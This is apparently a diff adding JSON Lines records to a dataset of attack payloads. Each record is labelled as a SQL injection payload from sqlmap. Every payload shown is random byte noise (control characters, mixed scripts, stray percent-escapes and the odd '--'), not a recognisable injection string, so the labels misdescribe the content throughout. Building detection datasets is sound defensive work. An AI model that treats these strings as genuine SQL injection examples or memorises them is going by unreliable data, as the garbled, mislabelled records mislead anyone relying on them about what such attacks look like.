+{"payload": "Oި\u0005~[F\u0004Y\u0002O\u00046\tl\u0013\u001b'\u0018V`kϬ{--t:\u00185N)@", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "7Mέ0%F7\u0014D\u0016̅yѥ|\u0007u:n_\u0005\u0010P\b\u0004&_ӥ,\u001bk:\u0002\u0018o<,<34}@HF\u001a.", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "σ:N^UїN9\"z;T'bu%7fZD|;?U`r%5i", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0000^юMqGş:9\u0013ߨn#9~Ԥ~\u00128;\u0007l<Sg\u00149Ӵ,GXa\u0001\u001f%BB\u0017g?", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ">\u0015\u0019\u00186\u0011˩/%\u0014\u0016\u0002E0[}4%76\u0002^ڄ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "`:},R-XWJAe,i%\u001f6+F%F5j+i̚kښ]W\u000e\u0011O\u0013V7mW,\u000eڽǮTĨ\u001a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$\u0000e3Ck\\j0\u0015Q\u0019c--'M\u0019\u0019\u0013;bԼ\u0012", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "/ɯ0\".j/T][\u000f/S\t%%C19", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "oMII\u0017\u0012V#\":\u0001l|콀J惽\bavdTKL2W.L}SB5\u0013{\u0011\\\u0005\u0014Qx{m| ]e*߀8\\',Ե\u0006Y75}ꢹG%37\u0001'", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "nZ%8d{S4>܉", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "u{^|.\\`#66 '%B8-\u001b\u0011cj\u0019\u0015K\u001aAa<6\u0001\u0015f8|ɁL+3e5$}J\u0018", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Zc.[@\\gCeuu4%8A\u001b>KQ\u001fGj^;|GVA1tdpq.I\\f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ">A%:~\u000fCkMD4\u0010%c69N\u0005G\t~tDg\tmI\u0005", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ">Ѫ/\u00127\"\u001b)N^*J@aJ--\u0011\u0013w؀׷.*\t\u001f̄", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Q*\u0012(\"]v\u0015,\u0015t\u00154\u0019N\u0016&%11F>%Oi{kI\u001b]\b9\\LV*Co-d`'<ڨ \u0007(8\u0006\u0016\u001131#N4\u0017\bT", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0017م%bfⱐi#\u0011;\u0002O", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ˊYj+f--D$Lw?.xM\u0013x,OT P", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "̾\u0016wwg\u00109\u0011\u001bF<\"\bVQ\u0013OcČ_a\u001flU\u0006rGԌ+ֱ{\u0011;ePG\u000e\u001a:< =J,<%98z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Vk\u001bgz[\u001f\u00035j(ǍX͂-Z\u0000CnK0ݚ%cb@-듵\u0018m2\u000e^Ru5r\u0011i[\t̍", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "|-\u0014^B:05ǸZ1op)gk-%f9o!jp2\u00007\u0000.n,k\u0017s\b{t", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ez]ƳS.U*ΉHea%4c\u0015+MM(h˧j{ImWDW*\u001a&8.pل", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0000鼎F&u<}\bθ%45p", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "W\u001f)&l%D5\u0019/}j/,c[NKןG{\u0007Z'lÿg!\b\u0018\u001f,\u0016D1I]Nr\u0015\u0000'd/ˢbn 툍", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0003*\u0014\u0005Э]h0ڵVauHtv$q.PvS\"xYWբ@X\\?\u0002b\u0003Ny%A3m\u0016ZL<", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016\u0001Y6,j^\u0007%16Z$8\u001b\u0010Y(;m`-\"!U\u000f7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "SU眮8;\u0018'9d\u0010DuџP\u0010*D](ֳL4g'OB\u0002\u0007PQ%5D]u#5k\u0016/AUW", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "/m\u0001\u0015YB$VrX\u0015\u0007v߫݊E~Mf\u0006I\u0007G]֕\u001fm\u001fQ\tD>-->J\u001baU2lTU\u0011%1@hʑ\u0010[\u0010Me*hAi", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "tT\u0017%-ӹ02\u0016}fafrys5-IO\u000e\u0017!r+2@1%3dE\u0016\u0013\u0013\u0014KidNɗזc^)Xbux\u0004ΨO/l%\u0007B?", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "S\u0002f%3e\u0002hu7+\u0012+\t˕h]W ~2k8k\u0004\u0003Ci%gQѮL\u001f\u0006u%?N0f8`_\b\u0014", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "x{L\\~[G1%F6v'-Ac}!*7\tG\u0014I\u0004T&|XU7M{rT}9:a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%9B", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "m,7]S`@\u0004-7Djk[yI\u0017)G\u00164W|\u000f!\u0001\u0004J\u0003ebIWd/\u0016YZ--u.+s", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Q;cVxXԫU%b1TF", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%3t2}żp9%18Z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "J;'e\"x\u0017%EcrÈ\u001aݝ\u0001H7؊0Y\u00115&0\u00002IջtJP\u0014\u00063[M|4+,`\u0015l6\u0005c%I", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "PTw\t_T|1\u0014X1gTk$\"i\u0015W\tڤEF/ \u0007Qc,#A$,J\b%EFy", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ɯ \u0018<v^%cd{\u0002ƅO晨*i\u0002\u0005E|:q\u0004\u0007\u0001\u0013\u0011\u0004*\u001b\u00004d)њ_8\u0004w5", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "AhÕ\u0007\u001a<GC\u001b!5eO˓ɯ\u0010LI\u0000\u001a%1E", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "5k5]^3/(7cE;Y\u001akkRX.d.e@e%fbA:&PȬB>\b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "GЅ\u000e$쉂W\u0005,˹fMRCe|uWRx&mA\u0005\t\u0006=A()=4:X\u0000jzaI\b/Apqo`(+\u0015%FB\u0004nIU3\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "o2]YH+d?ʆ\b9K}ٮ--\td42w\u001fTzEW^Cq\u0010*)G2%gNO/G\u001b.X2^E1Y2\u0002\u00053n U-U%ń25u﮷h?", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "!_L:?R=tUn^W>\u0000l\u0001'%f5zԻp\bx){;6Ep", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%77\\\u0000PeOzoR\u0018{\bZx%lGVOKSpn\u001a4\u0013F\u0006y4\u001b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "L\u001fr[7,Ȅ\u0010Ywbv\u0006@eTp_.&F&ԣ\u0001\tVO\u00119}\tUi@\u0005\u000f%CFt\u0004xSIX\u0005LI\u0006C\u0003u", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "rq\u000e>#\tw%B$Cޙi_\u0004|oD--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "W-h$\u0000\u0011j%AF\u0007\\\"b7NQ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}%56lӨ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "C\u0007\"\u0015--']N&NP\\^kϹڏ|\u000e_7o:\"A%\u0007ލ˳\u001fKRw0/o5\\ɖ|5ym\u000f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ".+--hYl+\"1\u0004*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "^Sqlx}X\u001a6R\u0010ą%cd", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ":\u0000c1oqӡ?Fvn\u001b#+Rs\u000f9\tj1\u0017{N\u0012㼺Xvb/%Aa^cyc68ƄI쇁jZ\bdcI\u0005\u0013\u0007wG\u0018OZl\u0000q\u0018] q87uѲ2)]", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "B\u000f?\u001fґmm8tŻD<Y\u0004H%Ql\t\u000e_6%54l*g\t0G\u0017i`|Ī(#=2e'=_E^|\u0010\u0019}\tN'^Y,!`z`\u0013:l\u001fRi[,4q\u0002|\"", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007\u0012<\u0012\u0000w%7Dqn%A@>\u0015ATID\u0004tH\\A5i/\u00020\u0015E!\u0006\u0003#hm\u0000$A3\u0014", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "?Z5`ib\u0019nB\u0005\u0004&cR!,Fm1\u0017b\u0007B&ww4X4l-)$߱l\u0012;\u000e_xp'LǙ\"\u0016EE)v\u0011(& @%6c<0;3&\u0019\u0011菉mV6\u000f˖\u0007pQ4&#'\u001b\u0018`\u0003Ln:<∊y)|\u0012x|dq`oA˪I\u0018ۀ\u0005e\"v_m6Йʄ\u000fh4\u001f06=&", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "S%58O[,;\u0010", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Jr[\b\u0003Ҭ@~~/}.dC/\u001bvu{s--nVb", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Qϵobu׆U`F\u001a^lRW}\u0011--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@k\u0013iaw@逥k\u0013o7%EF\u0011&k4P", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "5ʇ\u0015ƐhNIYSL23k[vrmVƵS:v\u0015a\u001a\u000fbf-\u0018kłZ:[k^aۭN\ts8P-iL;<֙\u000fk\u0003M0\u0019gR&1\u0002\u0015c_bao$ee\twP\u0010n0DD55\"\u0016\u0001%3c@X\u0003!", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "B%\"\u001aQ%87țgK;^\u0004\u000f{J5y\u0015D>Kܹנ\u0014ԟt܌8}/\u0012\u0018O\u0011\u0016m", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "HO7˝q\u001b\u0005u,\u00122h\u0017I,F'\u0000npZf>ܚ\u00103ӂP\u0010|\u0011rPh\t<3uB*\u0018iq7L%Fa", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016R%e3", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "h+\tB7\u0013{U^p\u0018>OƀL!ʄk'PW\u0000\u0015&~q_=_χœa1>\u00152ۙYܔߦ\\\u0019\u0015k^\u0016ߧiM9\u0016H%K~IqQ l%25l \u0007\u000eQz~^\u0001}\u0014U\u0013ޣdz\u000e!;lpD\u000eF§ƋbU\u0016\u0006܈<]\u0019E1vO**\u001f\u000e0o6$]\u0002\u0007Vr#\u0019u\u0017dH:R7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@--N-K", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0005t8lpH+`)蚽(Y\u00106g\u0017N}iZYh\u0011:--B2`!kE8Y`", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%B9bST9߰%Gw\tM~F+\u0006+ x\u0000\u001fPh\bwU l}xoD\u0012", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "@c|P\u0014\t\u0003A%D23\u0011a.(\u0019N݄AK7F\u0012وiu\bx?", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Nm--eO\u0001\u0016:\u0011LtâJo¨d#xϲA\u0016*mGnj", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "y\u0007y\u0007y]\u0002\u0004\u0006ȧOs#F^F^F^FFF>͍|\u001ba5EXF\t\"_\u0004Xkk7\u0016uc\"\u0013\u0003\u0016ܵؐ%29\\\u0007\u0012b\u0000!\t\u0002UrC\u0002/.\u0004B -LUǠ7z[@cHb޼\u0005@\u0017\u0014`H޶vK\u000e6s\u000e{bm/\u0018\u0005&)\u0004\u0016`` I\u0003p\u001a\tW\u001f^=xmEP2ܒ<7\u0006\u0006f)5vkecJ\u0006q\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "x\u0003%63c\u0014\u0013XXG.&1Ӂڳ\\X[nf*y-\u0019K=K=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Rh>n'>Hw,=ҹ\u0013J\u0007\u0016ğ\u001b\u0012'\u001a#8esn(񗄙hg\u0017\u001f2v?--zlf7k\tl2)I+d6~\u0012\u001a'}v.Rml|I\u0018㙦J}\u0017{s̃uœ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "m+-\u0005=\u0006--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "PHQX`'b[f\u001aP.(\u001bnoo3lWVJ?\u001am\u001b{\u00069=%8du\"\u0018{@z\u0015Zj\u0015]3>+\u0005=K\t%$F\u000f˞\u0012{\u0001B\u0012\b\"h^{\"5g(c\u0003>\u0002*ԋ\u0003\u0011th\u001f\u001b\u00142o\u0014\"tK)N0(;\u0018\u0006챏L\u0004\tH;a*EE5QDK\u00040Ј\u0001H\u0003\t\u0004 mc0!`ރuޱFQML3Ah\u0016U\u00009", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0019Btv\u0011--\u0007\u0003", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "A'e\u0004m:\u001a6/:2:'t1%CB\u0007\u0015\tPm'\u0017K\u0004\u000f,aCG", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0007hDeV\u0018$T\u0018E!!L\b݈7goV3zR邪{3@:lƧ\u0011^US\u0001tjj\u0012#z\u0005&P\b\u0002\\<G>=xB-\u0004 KH>\u0011;\u0012\u0013V(\"74--77\\H#\u0000a\u0006ڪuhh[b`q\tv?\u001bĲU7\u0004Rf9\u0015N\tLʾ=;(M:=a#;rȯ2\u0005׆TBJ(&%Z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%B2Y(\u0000Z e\u001fRЫ4`\u0014ZaA\t+N\u0005FW\u0015ήDj=TnDx", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "~~Z`Vm珢--UT8z\u0017ū\u0011H߈B\u000fnaZ\u00121S\u0000\t\u0018a\u0001TJ{\u0016ddADbd;\u0001\u0000", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "uS\u001aw狮W\u0004\u001f].|o+]UkRn[soY%zH!1\"FʂzL,\u000eP%25><y|yî,\t7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "7\u0013~\u0019Hd9\u0004h!#WE\u000e}`?x!fb),q'%cbv\u0011ӈq2\u000e&%+1Y8s", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "la%2a@D\u0012Z9\b\u000e!;V8\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ãyf&]dqC,A\\d;3G$\u0004:\u0001\u0016WQ$RV\u0004hK#*ԙ!Df%d3,KGb,\u0017fA=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "P`--$ߙu=xa$;Gb_^ȣ]OP5", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Y8-N\u001fd%e3", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "?~j97Jͨ9Ü\u0018=oy{@v*%0B;y\u0018nt\\\u0018α!5\u0017;@7㽱R3w1)w{߶ڱfkf\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%Fe1L", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&2V\u0006.P%cAe]Q6VlV*7۟j5QT\u0016\u0003f\u0017Uwݱ\u0010^u,2\u001aP--r}zȔ.Oyv_q~c!۟\u000eٳٽU+;|", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "C`\u0003k\u0012\u001b|Q<*k\u0015=fŕQ%5a0Sim\u001fe(Td}MqUmW\u001fybr̫7\u0016BR-۟2f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "o\u0001SUĉQNLƓ'\u001f$Yf\u0011P7%aez>v\u001a'!N8", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0000%F6$ԫl%QN\u00051);\\WՕ$_", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ǔ\u0006a̬.|۩\u000fKklXhX\u0004L+%49rb@0\"bӺ<j\\׏GiIͦP\u001fm7\u0012Z\u0001=>ޖrq\u001224Uow\u0016;]=\u000fU$8g=nNg5B;\tvw~97,nb^v{ijKyWv\u0006}Hԍn\u0007ՇnW \u001bÏseWq-rPj}qi|I>", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "26zY%0D|ivq2", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ":&%f0\u000e\u0017rSsҙeQ\u0016~\u0016g", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "j<-#I~꧜~\u000eP\u0001m$/\u0010!\u0004m\u0018%KlO~\u001b\u0011\u000e|>뽵Z=!km>g1%A3Z<9N/ҙ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Q6dYr)\u0016Эzl\\\u000f\u0013Jn%5A\tFDvgW)\u0004;2dg%JMXi\\]((}Vlun\u0013|X1:\u0012,(\u0005j~\u0016\u0016", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0000q=AD鸚mD\u0016v_Ӑ23^jEsV#^7:N7PP0S񈣺FF1=1'ea;@TF@_˥1ph6\u0001{\\ϛ0d\u0001p$YuQ\u001b\u000fWSZXcxNPh\u0007_s\u00052|,\u0011[ꫡ(6[kNhp'r&\u0005IX36$iԄ\u000e'3iK\t&\u0001xb\u0011O\u0013\u0005J]\u0001X^higm)6\u0006iA;t;C\u000748$hl:M\u0019", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "QFI\u0002qrRB̲,Ҹ2V1\u0019iYXe!1\u0013%e3", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "T@n{\u0002&8$P'*%B1AEX/\u0011Qmd>2T", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%b2& 㬯", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "I/Y|U\u00103an7s\u0012j-0\u0003\u00027n%10d̀@AGwiwު`;\u000f=/齪=Be¾=Q\u0000mE\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "a2`֓i[$\u0001F3/1\u00136ߝsSe\u001a\u0000]A.-aecgz\"3@a+!y\u0003%78f<", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\"J\u0013vu-&Yz!u\u0016p̡l0nNʱլv%EEh$\u0004V\u0018\u0000p[\u0006-E\u0012~ڽBmn;l\u0007V6ʡv`V7y[h\u000f\u0006~kCЧf=!āG#c{n|", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "XSHQw|\\\u0015\u0018M\u0005Z%0f\u001b=d\u001b\u000fLzMާ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "'LB;V1\u00117ܾ2t\u0003dKw_k:\u0002aSi*̧9枺\u0012SN`\u0007\u000146+\t6U3%W]\\p\u0011|֟r\b%n񼟫>N\u001a3ɹasi\u0013*9\u0019\u00127:ϯ\u001a--w*}5{9n\u0011Vj.Sf(\u0016}r>CAϽ`׽I4=e\u0006\u0010", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "AXOAv#NÌ8a\b7gn`Z\"\u0019\u0010\u0014\u0017vi \u0017<!3&%bd\u0004\u0014R\u0004#\u001fedl|o7DjqVb!C\u0011\u0013", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "dZK'&\t\u0006(eW<T'.2V26,'%2bI\u0005\u001f]z^\u0001\u0014H\u000e\u0007|2R\u0000[tR`с\b6WX_Ç0\u00191;W\u0014\u0014\u0007\u0014\"sjv", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "1$Ĭ\u0012_Q%fc2R ލ-D\u001f=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\bo\u0016%df$tǝۛ8[", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "tj\u0019S5.Ĩph%dE8f(v#z*ƨʀ5ʵ,̊\u0001e\u0003'\u0016cG\u0005K)9`*~10-qO.i", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "`%97%'\u001aIŏYᘊ\u0004\\\u0018\u001196\tЮHF@0\u001aiW\b\u0007/VXK\u0015})'H\u0003s]w\u0000T\u0014L\u0004m\u0005,#phN", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "g9\u0001\u0007O'ƟW-&Uj\btiEL\\\u0000mzm\u0001-R\u0013\u0002{n\u001bJΙeI\u0012?\u000fA|\tѴ\u00025\u0016O\u0002EA\u0002'zH_lRY7\b0*F--Ӵ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\\L4o*\u001a\u0003Bq!ēm\tM\u0014ED\u0014v到G䠘*%71\u001f894\u0006\u000e]eN\u0012E~+7\\I\u0013\u001fc8 Addea", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "o[FѴЦU\u0017<:!g%60\u0013ɔ7̛3Xz\u001fZ\u0001=F", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "jSR\u0003\u001f'9JKS*td!$5|#j\u000f;nt\u0013pܩ\u0014I[--ٯW:wqnqpl!ԹwߓJ=_v8ەʜesxH\\\\z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "F)\u001fO&鵑&%18X!\u00122oS\u0015;;n_N\u0012^2xR>f\u0016kBE%q2ڴ\u0000袠\u0015Ay=q\u0015Rv]+tWX_AЈO\u001a Rpk\u0002˫W@<is']f\t\u0003Wz\u0015\u0000>R\u000234W", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "7,\u0012\u0007δz\u0002I$ј#mDr$f\u0019%Df7AϕٻJ{\u0015t4J\"D:\u0006WA\b.zM\u0007\\aՐ\u000f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&B&O0dǃ?B\u0002`4QOz%D1^ZI\u0018cs\u0013\u0019Α\u0010\u0018a-\u0004\u001f1", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "򼏔~\u001a_JV=EE/q=B\u0011\u000f\u00067{|oS%2ajʏfm\u0015\u0003ߵ*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "'\b.HAI\u00120+\u0018h`%19", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0015zN\u0019ޖ7\u0013\u0001z\u0016\u0017V\u001ag\"a{,\u0012\u0012I@1\u0006#V.\u0016\u0007̣v`:IK\"C.mBada߱\u0000[cqjjRM3As323y'sB?~\u001a`=Y-7=΁oM/GPS-\u0013\u00118%0\u0019'&U᪰%E5ll:FH6{,L?f?z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "2p^vZ%9D\"6gz\u0019m", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001b\t9]],M'\\*\u0012SHgǧs!ot\u0014}pB\u00143\t&e=$}2v2MXi\\ԻX_6\u0017+--V{.\u0017/bg.P}K;ޔ;+h-k9^.qo|閪{\u00117gAOF6\u0019m3S'<OsF6\u0019m3Tgh\u00131l<\u0019fhI>کq2sѤyنc", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "([N*jZZcϳ'\u001fOپP+UŧxA|gxN'QPG9]\u000eHЏo`l~Z\"4,$\u001a\\\u0001o].X\tcן%8F\u0015kdOr,\u0015eRU\u0003", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\b{jԳgK5S\u000fw\u0015'g\u0000x%\bl߇?І0--\u0014`_q[\u0000\u0005@p=\u0016\u0001W\\o2>#]:tY7\u001fV|1'\u0012#I\u0016\u0000luT\\dչ#D\u0010\u001b\u0017*i<aLPd&Jue:\u0018rVA.mUw", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "fE\u00067\u0005P%BA Sq\u001a媷\u0010\u001aX\u001fΨB#6p\b\u0006ay$hm\u001a\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "wKv|>\u000fe\u0004\u001bO\u00128%F75%\u0017dvI\u0006h 7+", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "|\u0013\u0012+6 B\u0013A\u0000K\u0006\u0016Tȉ\u001a\u001b7\u0018H|9'Vs1)%b0", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "0d纇Cr\u00163<4J\u000f0`m䤱8h0\u0001:^\u000fH4_:V\u0018e\u000eK>_rM?f%c0\t@\u001a\u0000mQA(S\u0002Eш", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "({$Q4*Q:\u0011%ebCÜG\u0018&\u0005},YG", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "d8*+y'|QHzN%4fH6ZK!", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "bxú\bptX\u0018)*i܌\u0016DUB\u001f1VI7\u0005-%7CX\u0012\u0006ӓ!Ҹ1\u001f*\u001f)VUp1BjsO-˪\u0018fKH\u001b#\b\u001bW43/@", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "QQl,ɯ%9D\u0003:Q4ge5bX5mLs6Lc%I!e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016W#\u001bזx|ͭdԆ=$vJ\u00145mx%\u001a--Pv/BQ\u00079C", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "E\b%e0F$x\u0004F\u0012k;E\u0012-O\u0018!Wsre|\u0005\u0015XSx*", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "V|\u001b\b:\u0015Jkcm;1:ffDS4ߥ\u0006s\\j9g6?4{3\u0011t%7B\u000eq!\u0015]A6JԜRrJI`R(Fk\u0000TC1FUj", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u000e$9w&T5$5&H-1t Xmx%DEBr\\hWuc", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "4oܬfC\u0011R&--ݣ\u000fßSQp߷\"B ij?jb\u0011v-\u0003YC\u0007.}O}c03;@\\\u0004\u0006+zWJ&\u001bb", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "('>ovݶ\u0005Ty)X\\ ɦ@.Tř:ݖ?~K\\\u0017\"ƒ¦R*--K}+Z", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "S?GZ䅕\u0003|ˎ.\u0013\t6\u0006\u0019Z\u0013<%daGO?B_УFHtfpY.rEp\u0015Rw}!\u0014B\u000eB\u00188c\u0004nG$X()Al\u0007/$\u0007\u0014[7\u0010X5A⎈t1\u0017w7vqg\u001a\t-?P\\A)\u0007I^/%S֭3\u00042B\u001683\u0001!P", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "N>\u0019L9\u001foPխ}I\u001a}>\u0016i|y}Fg\u001a93} sJ>q;sz\u0017--^\u0011", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "z[z\u0018N\u0003\u001a\u0002qe|%284\u0004\u0018_?2{7ޭ<\u001bN6_)1iMwUp\u00032jy4bTr\u0003\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "G9\\_wV1X\u0011ims,b\u0007K&WOҲ$wӣLr\u0001\u00123%EB4~}\"P7[- ө5RG골\u0016}\u000e8\u0004S\u0007=_?\u00179e\u0005]2=q7uO7\u0006", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&R3!\u0003uu^Ҙ)\u00169ypVΩ-\u0012I-3WL4z\u0004e\u001b\u000fX?ƿT|j0e\"q\"ۖnr`%SJ@\tG4\u0014aBC\u001a֟'q\"-^\u0016K;\u0018&V&Y\\DH\u0010\u000fX,j;\u0004@L]\u0014\u0004]N%43ޒnx|&QrKs]嬄7H4OQMHbWNb\u0018^,%ɉ$\\jԂ\u001by*\u0012W^qo.>W׏", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Y*ZND\u0010iQ(T;M@snF@W\u0017xʫzEbÕzJFڦxiZ--\tp^-*V$*G`oPKZMteE)", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0000G+[--f^*o0^\u0017D%Y@4TD-ծ5Kto\u0019F{Ug<ulO\u00034k@z(9eX\bWa6Uh\u00007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "&ąX$敄4%FA}", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "t\u0000L--p\bq", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "8vrVLQS2-6yHW\u0016\u0000c^iUT*E%EcMD\u0017iH>V\u001f2f=TK<,28QTD\u0003", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "m\\WPbOƘmYcAh,fW\u0015}0\"A\u001a%R1\u001bvMj\u001b\u0013:\u0019b\u001f\u0000\u0014[?\u0011͗*8u\b=z-`^qŃH\u0002dsد\b\bNufe--\u000ew\u0019aQts\u00028&ΰ\u0001'G,8\u0004͌\u0001-d[`G\u0014\u0010k\u0004\u0017", "attack_type": "SQLi", "source": "sqlmap"}
